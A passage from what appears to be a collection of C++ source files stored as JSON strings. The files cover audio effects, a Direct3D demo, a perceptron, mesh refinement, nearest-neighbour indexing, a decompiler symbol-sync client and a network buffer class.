= (inL * dryMix + effectsL * wetMix) * vLevel;\n                //out[1][i] = (inL * dryMix + effectsR * wetMix) * vLevel;\n            }\n        }\n    }\n}\n          \n\nint main(void)\n{\n    float samplerate;\n\n    hw.Init();\n    samplerate = hw.AudioSampleRate();\n\n    hw.SetAudioBlockSize(48); \n\n    switch1[0]= Funbox::SWITCH_1_LEFT;\n    switch1[1]= Funbox::SWITCH_1_RIGHT;\n    switch2[0]= Funbox::SWITCH_2_LEFT;\n    switch2[1]= Funbox::SWITCH_2_RIGHT;\n    switch3[0]= Funbox::SWITCH_3_LEFT;\n    switch3[1]= Funbox::SWITCH_3_RIGHT;\n    dip[0]= Funbox::SWITCH_DIP_1;\n    dip[1]= Funbox::SWITCH_DIP_2;\n\n    pswitch1[0]= false;\n    pswitch1[1]= false;\n    pswitch2[0]= false;\n    pswitch2[1]= false;\n    pswitch3[0]= false;\n    pswitch3[1]= false;\n    pdip[0]= false;\n    pdip[1]= f",
    "#include \"Vertexium.hpp\"\n\nconst VERTEX VERTICES[3] =\n{\n    { 0.0f,  0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},   \n    {-0.5f, -0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},   \n    { 0.5f, -0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},\n\n};\n\n                                                           //forward decs\n                                            HWND hWnd; WNDCLASSEX wc; class D3D;\n\nint WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)\n{\n    ZeroMemory(&wc, sizeof(WNDCLASSEX));\n\n                                            wc.cbSize = sizeof(WNDCLASSEX);\n                                            wc.style = CS_HREDRAW | CS_VREDRAW;\n                                            wc.lpfnWndProc = WinProc;\n                                            wc.hInstance = hInstance;\n                                            wc.hCursor = LoadCursor(NULL, IDC_ARROW);\n                                            wc.lpszClassName = L\"WindowClass\";\n\n    RegisterClassEx(&wc);\n\n    RECT wr = { 0, 0, 800, 600 };\n    AdjustWindowRect(&wr, WS_OVERLAPPEDWINDOW, FALSE);\n\n    hWnd = CreateWindowEx\n    (\n                                            NULL,\n                                            L\"WindowClass\",\n                                            L\"I Love Vertices <3\",\n                                            WS_OVERLAPPEDWINDOW,\n                                            300,\n                                            300,\n                                            800,\n                                            800,\n                                            NULL,\n                                            NULL,\n                                            hInstance,\n                                            NULL\n    );\n\n    ShowWindow(hWnd, nCmdShow);\n\n    D3D* myD3D = new D3D;\n    myD3D->InitD3D(hWnd);myD3D->CompileShaders();myD3D->CreateBuffers(VERTICES);myD3D->DebugMemoryAddressesAndCompilation();\n\n    MSG message;\n    while(1)\n    {\n        if(PeekMessage(&message, NULL,0,0,PM_REMOVE))\n        {\n            TranslateMessage(&message);\n            DispatchMessage(&message);\n\n            if (message.message == WM_QUIT)\n                break;\n        }\n        else\n        {\n            myD3D->RenderFrame();\n        }\n    }\n\n    myD3D->ReleaseD3D(myD3D->swapChain, myD3D->device, myD3D->context, myD3D->p_BackBuffer, myD3D->p_VertexShader, myD3D->p_PixelShader);\n    return message.wParam;\n}",
    "#include <fstream>\n#include <string>\n#include <vector>\n#include \"perceptron.h\"\nusing namespace std;\n\nPerceptron::Perceptron(const string& weightsFile, double lr) : learningRate(lr), bias(0.0) {\n    ifstream inWeights(weightsFile);\n    double weight;\n    while (inWeights >> weight) {\n        weights.push_back(weight);\n    }\n    inWeights.close();\n}\n\nvoid Perceptron::weightsToFile(const string& weightsFile) {\n    ofstream outWeights(weightsFile);\n    if (outWeights.is_open()) {\n        for (double weight : weights) { // weight = weights[i]\n            outWeights << weight << \" \";\n        }\n        outWeights.close();\n    } else {\n        cout << \"unable to open weights file\\n\";\n    }\n}\n\nvoid Perceptron::biasToFile(const string& biasFile) {\n    ofstream outBias(biasFile);\n    if (outBias.is_open()) {\n        outBias << bias;\n        outBias.close();\n    } else {\n        cout << \"unable to open bias file\\n\";\n    }\n}\n\nint Perceptron::feedForward(const vector<int>& inputs) {\n    double sum = bias;\n    for (int i = 0; i < weights.size(); i++) {\n        sum += inputs[i]*weights[i];\n    }\n    \n    if (sum >= 0) {\n        return 1;\n    } else {\n        return -1;\n    }\n}\n\nvoid Perceptron::train(const vector<int>& inputs, int label) {\n    int prediction = feedForward(inputs);\n    int error = label - prediction;\n\n    bias += learningRate * error;\n    for (int i = 0; i < weights.size(); i++) {\n        weights[i] += learningRate * error * inputs[i];\n    }\n\n    weightsToFile(\"weights.txt\");\n    biasToFile(\"bias.txt\");\n}",
    "//#define Check_Flip_Tets\n#include <mtet/mtet.h>\n#include <mtet/io.h>\n#include <ankerl/unordered_dense.h>\n#include <span>\n#include <queue>\n#include <optional>\n#include <SmallVector.h>\n\n#include <implicit_functions.h>\n#include <subdivide_multi.h>\n#include <CLI/CLI.hpp>\n#include <tet_quality.h>\n#include <timer.h>\n#include <grid_mesh.h>\n\n\nusing namespace mtet;\n\nbool save_mesh_json(const std::string& filename,\n                    const mtet::MTetMesh mesh)\n{\n    vector<array<double, 3>> vertices((int)mesh.get_num_vertices());\n    vector<array<size_t, 4>> tets((int)mesh.get_num_tets());\n    using IndexMap = ankerl::unordered_dense::map<uint64_t, size_t>;\n    IndexMap vertex_tag_map;\n    vertex_tag_map.reserve(mesh.get_num_vertices());\n    int counter = 0;\n    mesh.seq_foreach_vertex([&](VertexId vid, std::span<const Scalar, 3> data){\n        size_t vertex_tag = vertex_tag_map.size() + 1;\n        vertex_tag_map[value_of(vid)] = vertex_tag;\n        vertices[counter] = {data[0], data[1], data[2]};\n        counter ++;\n    });\n    counter = 0;\n    mesh.seq_foreach_tet([&](TetId, std::span<const VertexId, 4> data) {\n        tets[counter] = {vertex_tag_map[value_of(data[0])] - 1, vertex_tag_map[value_of(data[1])] - 1, vertex_tag_map[value_of(data[2])] - 1, vertex_tag_map[value_of(data[3])] - 1};\n        counter ++;\n    });\n    if (std::filesystem::exists(filename.c_str())){\n        std::filesystem::remove(filename.c_str());\n    }\n    using json = nlohmann::json;\n    std::ofstream fout(filename.c_str(),std::ios::app);\n    json jOut;\n    jOut.push_back(json(vertices));\n    jOut.push_back(json(tets));\n    fout << jOut.dump(4, ' ', true, json::error_handler_t::replace) << std::endl;\n    fout.close();\n    return true;\n}\n\nbool save_function_json(const std::string& filename,\n                        const mtet::MTetMesh mesh,\n                        ankerl::unordered_dense::map<uint64_t, llvm_vecsmall::SmallVector<std::array<double, 4>, 20>> vertex_func_grad_map,\n                        const size_t funcNum)\n{\n    vector<vector<double>> values(funcNum);\n    for (size_t funcIter = 0; funcIter <  funcNum; funcIter++){\n        values[funcIter].reserve(((int)mesh.get_num_vertices()));\n    }\n    mesh.seq_foreach_vertex([&](VertexId vid, std::span<const Scalar, 3> data){\n        llvm_vecsmall::SmallVector<std::array<double, 4>, 20> func_gradList(funcNum);\n        func_gradList = vertex_func_grad_map[value_of(vid)];\n        for (size_t funcIter = 0; funcIter < funcNum; funcIter++){\n            cout << data[0] << \" \" << data[1] << \" \" << data[2] << \": \" << func_gradList[funcIter][0] << \", \" << func_gradList[funcIter][1] << \", \" << func_gradList[funcIter][2] << \", \" << func_gradList[funcIter][3] << endl;\n            values[funcIter].push_back(func_gradList[funcIter][0]);\n        }\n    });\n    if (std::filesystem::exists(filename.c_str())){\n        std::filesystem::remove(filename.c_str());\n    }\n    using json = nlohmann::json;\n    std::ofstream fout(filename.c_str(),std::ios::app);\n    json jOut;\n    for (size_t funcIter = 0; funcIter <  funcNum; funcIter++){\n        json jFunc;\n        jFunc[\"type\"] = \"customized\";\n        jFunc[\"value\"] = values[funcIter];\n        jOut.push_back(jFunc);\n    }\n    fout << jOut.dump(4, ' ', true, json::error_handler_t::replace) << std::endl;\n    fout.close();\n    return true;\n}\n//hash for mounting a boolean that represents the activeness to a tet\n//since the tetid isn't const during the process, mount the boolean using vertexids of 4 corners.\nuint64_t vertexHash(std::span<VertexId, 4>& x)\n{\n    ankerl::unordered_dense::hash<uint64_t> hash_fn;\n    return hash_fn(value_of(x[0])) + hash_fn(value_of(x[1])) + hash_fn(value_of(x[2])) + hash_fn(value_of(x[3]));\n}\n\nint main(int argc, const char *argv[])\n{\n    struct\n    {\n        string mesh_file;\n        string function_file;\n        double threshold = 0.0001;\n        double alpha = std::numeric_limits<double>::infinity();\n        int max_elements = -1;\n        double smallest_edge_length = 0;\n        string method = \"IA\";\n        string csg_file;\n        bool bfs = false;\n        bool dfs = false;\n        bool curve_network = false;\n        //bool analysis_mode = false;\n    } args;\n    CLI::App app{\"Longest Edge Bisection Refinement\"};\n    app.add_option(\"mesh\", args.mesh_file, \"Initial mesh file\")->required();\n    app.add_option(\"function\", args.function_file, \"Implicit function file\")->required();\n    app.add_option(\"-t,--threshold\", args.threshold, \"Threshold value\");\n    app.add_option(\"-a,--alpha\", args.alpha, \"Alpha value\");\n    app.add_option(\"-o,--option\", args.method, \"Options of implicit manifold\");\n    app.add_option(\"--tree\", args.csg_file, \"CSG Tree file\");\n    app.add_option(\"-m,--max-elements\", args.max_elements, \"Maximum number of elements\");\n    app.add_option(\"-s,--shortest-edge\", args.smallest_edge_length, \"Shortest edge length\");\n    app.add_option(\"-b, --bfs\", args.bfs, \"Toggle BFS Mode\");\n    app.add_option(\"-d, --dfs\", args.dfs, \"Togg",
    "#include <unordered_set>\n#include <unordered_map>\n#include <vector>\n#include <string>\n#include <iostream>\n\nclass Variations {\nprivate:\n    int n_objects_, n_places_;\n    std::vector<int> var_;\n\n    void nextVariation() {\n        int i = n_places_ - 1;\n        while (var_[i] == n_objects_ - 1) {\n            --i;\n        }\n        ++var_[i];\n        for (int j = i + 1; j < n_places_; ++j) {\n            var_[j] = 0;\n        }\n    }\n\n    void print() {\n        for (size_t i = 0; i < var_.size() - 1; ++i) {\n            std::cout << var_[i] + 1 << \" \";\n        }\n        std::cout << var_.back() + 1 << \"\\n\";\n    }\n\npublic:\n    Variations(int n_objects, int n_places) {\n        n_objects_ = n_objects;\n        n_places_ = n_places;\n        var_.resize(n_places_);\n    }\n\n    void printVariationByIndex(int variation_i) {\n        for (int i = 0; i < variation_i; ++i) {\n            nextVariation();\n        }\n        print();\n    }\n};\n\nint main() {\n    std::ios_base::sync_with_stdio(false);\n    std::cin.tie(nullptr);\n\n    int n_tracks, n_places, variation_i;\n    std::cin >> n_tracks >> n_places >> variation_i;\n    Variations algo(n_tracks, n_places);\n    algo.printVariationByIndex(variation_i - 1);\n    return 0;\n}\n",
    "#include \"iter.hpp\"\n\nvoid  print_ints(const int &i)\n{\n    std::cout << \"INT: \" << i << '\\n';\n}\n\nint main()\n{\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST INT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    int array[4] = {1, 2, 3, 4};\n    for(int i = 0; i < 4; i++)\n    {\n        std::cout << \"Here: \" << array[i] << std::endl;\n    }\n    iter(array, 4, increment);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for(int i = 0; i < 4; i++)\n    {\n        std::cout << \"Here: \" << array[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST DOUBLE ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    double doubleArray[] = {1.5, 2.5, 3.5, 4.5, 5.5};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << doubleArray[i] << std::endl;\n    }\n    iter(doubleArray, 5, doubleNumber);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << doubleArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST FLOAT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    float floatArray[] = {1.1f, 2.2f, 3.3f, 4.4f, 5.5f};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << floatArray[i] << std::endl;\n    }\n    iter(floatArray, 5, square);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << floatArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST STRING ARRAY 1:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::string stringArray[] = {\"hello\", \"world\", \"how\", \"are\", \"you\"};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n    iter(stringArray, 5, addExclamation);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST STRING ARRAY 2:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n    iter(stringArray, 5, capitalize);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST CONST INT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    int array2[4] = {1, 2, 3, 4};\n    const int *array3 = array2;\n    for(int i = 0; i < 4; i++)\n    {\n        std::cout << \"Here: \" << array3[i] << std::endl;\n    }\n    std::cout << std::endl << GREEN \"FUNCTION TO PRINT ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    iter(array3, 4, print_ints);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::co",
    "#include <gtest/gtest.h>\n#include <omp.h>\n\n#include <algorithm>\n#include <boost/dynamic_bitset.hpp>\n#include <boost/program_options.hpp>\n#include <chrono>\n#include <cmath>\n#include <fstream>\n#include <iostream>\n#include <string>\n#include <vector>\n\n#include \"efanna2e/distance.h\"\n#include \"efanna2e/neighbor.h\"\n#include \"efanna2e/parameters.h\"\n#include \"efanna2e/util.h\"\n#include \"index_bipartite.h\"\n\nnamespace po = boost::program_options;\n\nint main(int argc, char **argv) {\n    std::string base_data_file;\n    std::string sampled_query_data_file;\n    // std::string query_data_file;\n    std::string bipartite_index_save_file, projection_index_save_file, learn_base_nn_file, base_learn_nn_file;\n    std::string data_type;\n    std::string dist;\n    uint32_t M_sq;\n    uint32_t M_pjbp, L_pjpq;\n    // uint32_t L_pq;\n    uint32_t num_threads;\n\n    po::options_description desc{\"Arguments\"};\n    try {\n        desc.add_options()(\"help,h\", \"Print information on arguments\");\n        desc.add_options()(\"data_type\", po::value<std::string>(&data_type)->required(), \"data type <int8/uint8/float>\");\n        desc.add_options()(\"dist\", po::value<std::string>(&dist)->required(), \"distance function <l2/ip>\");\n        desc.add_options()(\"base_data_path\", po::value<std::string>(&base_data_file)->required(),\n                           \"Input data file in bin format\");\n        desc.add_options()(\"sampled_query_data_path\", po::value<std::string>(&sampled_query_data_file)->required(),\n                           \"Sampled query file in bin format\");\n        // desc.add_options()(\"query_data_path\",\n        //                    po::value<std::string>(&query_data_file)->required(),\n        //                    \"Query file in bin format\");\n        // desc.add_options()(\"bipartite_index_save_path\", po::value<std::string>(&bipartite_index_save_file)->required(),\n                        //    \"Path prefix for saving bipartite index file components\");\n        desc.add_options()(\"projection_index_save_path\",\n                           po::value<std::string>(&projection_index_save_file)->required(),\n                           \"Path prefix for saving projetion index file components\");\n        // desc.add_options()(\"M_bp\", po::value<uint32_t>(&M_bp)->default_value(32),\n                        //    \"Number of neighbors for base points to build the bipartite graph\");\n        desc.add_options()(\"M_sq\", po::value<uint32_t>(&M_sq)->default_value(32),\n                           \"Number of neighbors for sampled query points to build the bipartite graph\");\n        desc.add_options()(\"M_pjbp\", po::value<uint32_t>(&M_pjbp)->default_value(32),\n                           \"Number of neighbors for projection graph\");\n        desc.add_options()(\"L_pjpq\", po::value<uint32_t>(&L_pjpq)->default_value(32),\n                           \"Priority queue length for projection graph searching\");\n\n        // desc.add_options()(\"L_pq\", po::value<uint32_t>(&L_pq)->default_value(32),\n        //                    \"Priority queue length for searching\");\n        desc.add_options()(\"num_threads,T\", po::value<uint32_t>(&num_threads)->default_value(omp_get_num_procs()),\n                           \"Number of threads used for building index (defaults to \"\n                           \"omp_get_num_procs())\");\n        desc.add_options()(\"learn_base_nn_path\", po::value<std::string>(&learn_base_nn_file)->required(),\n                           \"Path of learn-base NN file\");\n        // desc.add_options()(\"base_learn_nn_path\", po::value<std::string>(&base_learn_nn_file)->required(),\n        //                    \"Path of base-learn NN file\");\n\n        po::variables_map vm;\n        po::store(po::parse_command_line(argc, argv, desc), vm);\n        if (vm.count(\"help\")) {\n            std::cout << desc;\n            return 0;\n        }\n        po::notify(vm);\n    } catch (const std::exception &ex) {\n        std::cerr << ex.what() << '\\n';\n        return -1;\n    }\n    std::cout << \"sampled query: \" << sampled_query_data_file << std::endl;\n    uint32_t base_num, base_dim, sq_num, sq_dim;\n    efanna2e::load_meta<float>(base_data_file.c_str(), base_num, base_dim);\n    efanna2e::load_meta<float>(sampled_query_data_file.c_str(), sq_num, sq_dim);\n    efanna2e::Metric dist_metric = efanna2e::INNER_PRODUCT;\n    if (dist == \"l2\") {\n        dist_metric = efanna2e::L2;\n        std::cout << \"Using l2 as distance metric\" << std::endl;\n    } else if (dist == \"ip\") {\n        dist_metric = efanna2e::INNER_PRODUCT;\n        std::cout << \"Using inner product as distance metric\" << std::endl;\n    } else if (dist == \"cosine\") {\n        dist_metric = efanna2e::COSINE;\n        std::cout << \"Using cosine as distance metric\" << std::endl;\n    } else {\n        std::cout << \"Unknown distance type: \" << dist << std::endl;\n        return -1;\n    }\n\n    float *data_bp = nullptr;\n    float *data_sq = nullptr;\n    float *aligned_data_bp = nullptr;\n    float *aligned_data_sq = nullptr;\n    efanna2e::Parameters parameters;\n    efanna2e::lo",
    "#include \"SourceSyncClient.h\"\n\nnamespace srcsync\n{\n\tsrcsync::SourceSyncClient::SourceSyncClient(std::unique_ptr<DecompilerSynchronizer::Stub> Stub) :\n\t\tm_Stub(std::move(Stub)), m_ModuleImageName(), m_PdbPath(), m_ModuleAddressRange(), m_CallstackFunctionBoundariesRva()\n\t{\n\t}\n\n\tvoid SourceSyncClient::Initialize()\n\t{\n\t\tgrpc::ClientContext context{};\n\t\tEmptyRequestReply request, reply;\n\t\tm_Stub->Initialize(&context, request, &reply);\n\t}\n\n\tbool SourceSyncClient::FetchDecompiledModuleData()\n\t{\n\t\tauto moduleName = FetchDecompiledModuleName();\n\t\tauto pdbPath = FetchPdbPath();\n\t\tif (moduleName.empty() || pdbPath.empty())\n\t\t{\n\t\t\treturn false;\n\t\t}\n\n\t\tm_ModuleImageName = std::move(moduleName);\n\t\tm_PdbPath = std::move(pdbPath);\n\n\t\treturn true;\n\t}\n\n\tstd::string SourceSyncClient::GetDecompiledModuleImageName()\n\t{\n\t\treturn m_ModuleImageName;\n\t}\n\n\tstd::string SourceSyncClient::GetPdbPath()\n\t{\n\t\treturn m_PdbPath;\n\t}\n\n\tvoid SourceSyncClient::SetModuleAddressRange(size_t Start, size_t End)\n\t{\n\t\tm_ModuleAddressRange.Start = Start;\n\t\tm_ModuleAddressRange.End = End;\n\t}\n\n\tbool SourceSyncClient::GeneratePdbForCallstack(std::span<const size_t> FunctionsVa)\n\t{\n\t\tif (!FunctionsVa.empty() && !m_CallstackFunctionBoundariesRva.empty())\n\t\t{\n\t\t\tif (CallstackContainedInPreviousOne(FunctionsVa))\n\t\t\t{\n\t\t\t\treturn true;\n\t\t\t}\n\t\t}\n\n\t\tgrpc::ClientContext context{};\n\t\tGeneratePdbForCallstackRequest request{};\n\t\tGeneratePdbForCallstackReply reply{};\n\t\tfor (const auto functionVa : FunctionsVa)\n\t\t{\n\t\t\tif (m_ModuleAddressRange.IsInside(functionVa))\n\t\t\t{\n\t\t\t\trequest.add_functionsrva(functionVa - m_ModuleAddressRange.Start);\n\t\t\t}\n\t\t}\n\n\t\tconst auto status = m_Stub->GeneratePdbForCallstack(&context, request, &reply);\n\t\tif (!status.ok())\n\t\t{\n\t\t\treturn false;\n\t\t}\n\n\t\tm_CallstackFunctionBoundariesRva.clear();\n\t\tfor (int i{}; i < reply.functionsboundaries_size(); ++i)\n\t\t{\n\t\t\tconst auto& functionBoundaries = reply.functionsboundaries(i);\n\t\t\tm_CallstackFunctionBoundariesRva.push_back({ functionBoundaries.startoffunctionrva(), functionBoundaries.endoffunctionrva() });\n\t\t}\n\n\t\treturn true;\n\t}\n\n\tbool SourceSyncClient::ShouldUpdateSymbols()\n\t{\n\t\tgrpc::ClientContext context{};\n\t\tEmptyRequestReply request{};\n\t\tShouldUpdateSymbolsReply reply{};\n\t\tconst auto status = m_Stub->ShouldUpdateSymbols(&context, request, &reply);\n\t\tif (!status.ok())\n\t\t{\n\t\t\treturn {};\n\t\t}\n\n\t\treturn reply.status();\n\t}\n\n\tstd::string SourceSyncClient::FetchDecompiledModuleName()\n\t{\n\t\tgrpc::ClientContext context{};\n\t\tEmptyRequestReply request{};\n\t\tDecompiledModuleNameReply reply{};\n\t\tconst auto status = m_Stub->GetDecompiledModuleName(&context, request, &reply);\n\t\tif (!status.ok())\n\t\t{\n\t\t\treturn {};\n\t\t}\n\n\t\treturn reply.modulename();\n\t}\n\n\tstd::string SourceSyncClient::FetchPdbPath()\n\t{\n\t\tgrpc::ClientContext context{};\n\t\tEmptyRequestReply request{};\n\t\tGetPdbPathReply reply{};\n\t\tconst auto status = m_Stub->GetPdbPath(&context, request, &reply);\n\t\tif (!status.ok())\n\t\t{\n\t\t\treturn {};\n\t\t}\n\n\t\treturn reply.pdbpath();\n\t}\n\n\tbool SourceSyncClient::CallstackContainedInPreviousOne(std::span<const size_t> FunctionsVa)\n\t{\n\t\tfor (const auto functionVa : FunctionsVa)\n\t\t{\n\t\t\tif (!m_ModuleAddressRange.IsInside(functionVa))\n\t\t\t{\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tconst auto functionRva = functionVa - m_ModuleAddressRange.Start;\n\t\t\tif (!std::ranges::any_of(m_CallstackFunctionBoundariesRva, [functionRva](const auto& CallstackFunctionBoundarie) {\n\t\t\t\treturn functionRva >= CallstackFunctionBoundarie.Start && functionRva < CallstackFunctionBoundarie.End;\n\t\t\t}))\n\t\t\t{\n\t\t\t\treturn false;;\n\t\t\t}\n\t\t}\n\n\t\treturn true;\n\t}\n}",
    "/**\n * @file buffer.cpp\n * @author {gangx} ({gangx6906@gmail.com})\n * @brief \n * @version 0.1\n * @date 2024-05-03\n * \n * @copyright Copyright (c) 2024\n * \n */\n#include \"buffer.hpp\"\n#include <cassert>\n#include <cstddef>\n#include <sys/types.h>\n#include <unistd.h>\n#include <cstring>\n#include \"sys/uio.h\"\n#include <iostream>\nBuffer::Buffer(size_t initBufferSize):buffer_(initBufferSize),read_pos_(0),write_pos_(0){\n\n}\nsize_t Buffer::ReadableBytes() const{\n    return write_pos_ - read_pos_;//\u8fd4\u56de\u53ef\u4ee5\u5199\u7684\u4f4d\u7f6e\u548c\u8bfb\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u957f\u5ea6\n}\n\nsize_t Buffer::WriteableBytes() const{\n    return buffer_.size() - write_pos_;//\u8fd4\u56de\u73b0\u5728\u7f13\u5b58\u7684\u5927\u5c0f\u51cf\u53bb\u5199\u5165\u7684\u4f4d\u7f6e\n}\n\nsize_t Buffer::PrependableBytes() const{\n    return read_pos_;//\u8fd4\u56de\u8bfb\u53d6\u7684\u4f4d\u7f6e\n}\nconst char* Buffer::Peek() const{\n    return BeginPtr_() + read_pos_;//\u8fd4\u56de\u7f13\u5b58\u5f00\u59cb\u5730\u5740\u52a0\u4e0a\u8bfb\u53d6\u7684\u4f4d\u7f6e\n}\n\nvoid Buffer::Retrieve(size_t len){\n    assert(len <= ReadableBytes());//\u68c0\u67e5\u662f\u5426\u8d8a\u754c\n    read_pos_ += len;//\u66f4\u65b0\u8bfb\u53d6\u4f4d\u7f6e\n}\n\nvoid Buffer::RetrieveUntil(const char* end){\n    assert(Peek() <= end);//\u68c0\u67e5\u53c2\u6570\u662f\u5426\u5728\u5f53\u524d\u4f4d\u7f6e\u4e4b\u524d\n    Retrieve(end - Peek());\n}\n\nvoid Buffer::RetrieveAll(){\n    bzero(&buffer_[0], buffer_.size());//\u6e05\u7a7a\u7f13\u5b58\u7684\u5185\u5bb9\n    //\u521d\u59cb\u5316\u8bfb\u5199\u4f4d\u7f6e\n    read_pos_ = 0;\n    write_pos_ = 0;\n}\n\nstd::string Buffer::RetrieveAllToStr(){\n    std::string str(Peek(),ReadableBytes());//\u521b\u5efa\u7f13\u51b2\u5269\u4f59\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\n    RetrieveAll();//\u6e05\u7a7a\u7f13\u51b2\n    return str;\n}\n\nconst char* Buffer::BeginWriteConst() const{\n    return BeginPtr_() + write_pos_;//\u83b7\u53d6\u5199\u4f4d\u7f6e\u7684\u6307\u9488\n}\n\nchar* Buffer::BeginWrite(){\n    return BeginPtr_() + write_pos_;//\u83b7\u53d6\u5199\u4f4d\u7f6e\u7684\u6307\u9488\n}\n\nvoid Buffer::HasWritten(size_t len){\n    write_pos_ += len;//\u5df2\u7ecf\u5199\u5165\u4fee\u6539\u5199\u7684\u4f4d\u7f6e\n}\n\nvoid Buffer::Append(const std::string& str){\n    Append(str.data(),str.size());//\u6dfb\u52a0\u5b57\u7b26\u4e32\u5230\u7f13\u5b58\n}\n\nvoid Buffer::Append(const char* str,size_t len){\n    assert(str);//\u65ad\u8a00\u5224\u65ad\n    EnsureWriteable(len);//\u786e\u4fdd\u7f13\u5b58\u7a7a\u95f4\u8db3\u591f\u5199\u5165\n    std::copy(str,str + len, BeginWrite());//\u62f7\u8d1d\u5b57\u7b26\u4e32\u5230\u7f13\u5b58\u5199\u5165\u7684\u5f00\u59cb\u5730\u5740\n    HasWritten(len);//\u5df2\u7ecf\u5199\u5165\u4fee\u6539\u5199\u5165\u4f4d\u7f6e\n}\n\nvoid Buffer::Append(const void* data,size_t len){\n    assert(data);//\u65ad\u8a00\u5224\u65ad\n    Append(static_cast<const char*>(data),len);//\u8f6c\u6362\u4e3a\u5b57\u7b26\u6307\u9488\u8fdb\u884c\u5199\u5165\n}\n\nvoid Buffer::Append(const Buffer& buff){\n    Append(buff.Peek(),buff.ReadableBytes());\n}\n\nvoid Buffer::EnsureWriteable(size_t len){\n    if(WriteableBytes() < len){//\u53ef\u4ee5\u5199\u5165\u7684\u957f\u5ea6\u5c0f\u5c31\u8fdb\u884c\u6269\u5bb9\n        MakeSpace_(len);\n    }\n    assert(WriteableBytes() >= len);//\u65ad\u8a00\u5224\u65ad\u6269\u5bb9\u4e4b\u540e\u7684\u53ef\u5199\u957f\u5ea6\u8db3\u591f\n}\n\nssize_t Buffer::ReadFd(int fd,int* savedErrno){\n    char buff[65536];\n    struct iovec iov[2];\n    const size_t writable = WriteableBytes();\n    /**\u8fdb\u884cIO\u8bfb\u5199\u7684\u5206\u6563**/\n    iov[0].iov_base = BeginPtr_() + write_pos_;//\u5199\u5165\u4f4d\u7f6e\u7684\u6307\u9488\u4f5c\u4e3a\u7f13\u5b58\u5f00\u59cb\n    iov[0].iov_len = writable;\n    iov[1].iov_base = buff;//\u4ee5\u7f13\u5b58\u7c7b\u7684\u5f00\u59cb\u4f5c\u4e3a\u5f00\u59cb\n    iov[1].iov_len = sizeof(buff);\n    const ssize_t len = readv(fd,iov,2);//\u5206\u805a\u8bfb\u53d6\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u5185\u5bb9\u5230\n    if(len < 0){//\u5224\u65ad\u662f\u5426\u8bfb\u53d6\u9519\u8bef\n        *savedErrno = errno;\n    }else if(static_cast<size_t>(len) <= writable){//\u8bfb\u53d6\u7684\u5185\u5bb9\u5168\u90e8\u5230\u4e86\u7f13\u5b58\u7c7b\u91cc\u9762\u4e86\n        write_pos_ += len;\n    }else{//\u6709\u6570\u636e\u8bfb\u53d6\u5230\u4e86\u4e34\u65f6\u7684\u7f13\u5b58\u53d8\u91cf\u91cc\u9762\u4e86\n        